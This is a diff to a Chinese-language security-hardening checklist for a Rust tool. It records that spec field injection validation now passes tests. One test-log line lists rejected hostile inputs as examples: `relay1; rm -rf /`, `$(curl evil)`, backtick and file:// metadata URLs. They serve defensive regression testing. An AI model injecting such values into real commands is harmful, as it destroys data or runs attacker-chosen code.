@@ -253,8 +253,8 @@ agent 装 skill",又不给决策层留投毒面。
 - [x] p3-4 审计记录实际执行的确切 `ouro` 版本(可复现):terminal detail `ouro=<ver>`(+ rollback_reset)。
 
 ### p4 — 安全加固(web/prompt/dispatch 面;在 S0015 契约上扩展)
-- [ ] p4-1 spec 字段注入校验(每个被目标脚本插值的字段:host/metadata_url/ticker…;承接 S0015
-  shell 注入回归;注意 schema 里 host 仅 `minLength:1`)
+- [x] p4-1 spec 字段注入校验(`PoolSpec::validate`:machine.id/ssh.host/endpoint.host=[a-z0-9-.:]、
+  ticker=[A-Z0-9]、metadata_url=clean http(s);承接 S0015 shell 注入回归)。真实 spec 全过、注入被拒。
 - [ ] p4-2 人工确认显示 ground-truth(凡 `changed=true` 写操作:扩展 confirm + 展示 `ssh.rs` 将执行
   的真实 argv,不回显 prompt 自述);通用化前威胁模型标注 planned
 - [ ] p4-3 威胁模型 / 适用边界文档化(「保护什么/不保护什么」表 + #2 旁路 + #4 云可见性 + bootstrap
@@ -349,6 +349,9 @@ agent 装 skill",又不给决策层留投毒面。
 - p3-2/3/4 | stack: rust | command: cargo test version:: + tool run --min-ouro | result: pass | note:
   required=max(prompt_min,内嵌地板,rollback,security);--min-ouro 9.9.9 fail-closed;--min-ouro 0.1.0 通过;
   审计 detail 记 ouro=0.1.0;擦除/伪造 floor→回落内嵌地板非零(3 单测);HMAC(tool-run.secret) 防篡改。
+- p4-1 | stack: rust | command: cargo test (33 passed) + ouro spec validate | result: pass | note:
+  `relay1; rm -rf /`/`$(curl evil)`/backtick metadata_url/file://、含空格的 machine id、非 alnum ticker 均被拒;
+  bed/quorum2/minimal 三份真实 spec 仍 ok(无误报)。
 
 ## 7. Change Requests (append-only)
 - 2026-07-09 范围拆分:p5/p6/审计反签名 移出 → S0017。
